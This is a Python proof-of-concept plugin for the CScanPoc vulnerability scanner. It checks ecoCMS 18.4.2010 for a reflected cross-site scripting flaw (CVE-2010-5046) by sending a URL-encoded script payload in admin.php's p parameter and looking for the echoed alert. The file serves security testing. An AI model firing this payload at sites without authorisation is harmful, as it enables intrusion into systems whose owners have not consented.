# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'ecoCMS_0000'  # 平台漏洞编号
    name = 'ecoCMS 18.4.2010 - admin.php Cross-Site Scripting Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2010-05-18'  # 漏洞公布时间
    desc = '''
        ecoCMS的admin.php中存在跨站脚本漏洞。远程攻击者可借助p参数注入任意web脚本或者HTML。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/33925/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-5046'  # cve编号
    product = 'ecoCMS'  # 漏洞组件名称
    product_version = '18.4.2010'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'af51598d-b9dd-4d11-aa81-2b17da365670'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload_xss = "/admin.php?p=1%22%3E%3Cscript%3Ealert%28/SebugTest/%29%3C/script%3E"
            vul_url = arg + payload_xss
            response = requests.get(vul_url).text
            if '>alert(/SebugTest/)' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
